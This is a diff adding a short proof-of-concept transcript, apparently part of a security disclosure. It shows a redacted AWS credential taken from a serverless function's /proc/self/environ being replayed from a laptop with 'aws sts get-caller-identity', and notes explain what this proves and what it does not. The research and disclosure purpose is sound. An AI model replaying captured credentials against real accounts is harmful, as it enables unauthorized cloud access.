@@ -1,0 +1,28 @@
+# The captured credential, used from a laptop instead of the function.
+#
+# Values masked by poc/redact.py: the account id keeps six digits, the role ARN
+# keeps its path, the session name keeps its prefix. The point of this transcript
+# is that the credential answers, and that the answer names a role rather than a
+# user.
+
+$ aws sts get-caller-identity --profile twilio-leak
+{
+  "UserId":  "AROAY2IZEHUX66TGRZI3L:ZBe35605a7…",
+  "Account": "606179966…",
+  "Arn":     "arn:aws:sts::606179966…:assumed-role/lambda-role-execution/ZBe35605a7…"
+}
+
+# What this establishes:
+#
+#   * the three values from /proc/self/environ form a working AWS credential
+#     outside the function's process;
+#   * it is an assumed-role credential (ASIA prefix, role path in the ARN), not a
+#     long-lived IAM user key;
+#   * the identity is the execution role the platform assigned, and the account
+#     is the one behind the trial.
+#
+# What it does NOT establish, on its own:
+#
+#   * that the role can read anything, write anything, or reach another tenant.
+#     GetCallerIdentity answers for everyone, including principals with no
+#     permissions at all. The next file is where permission is actually measured.
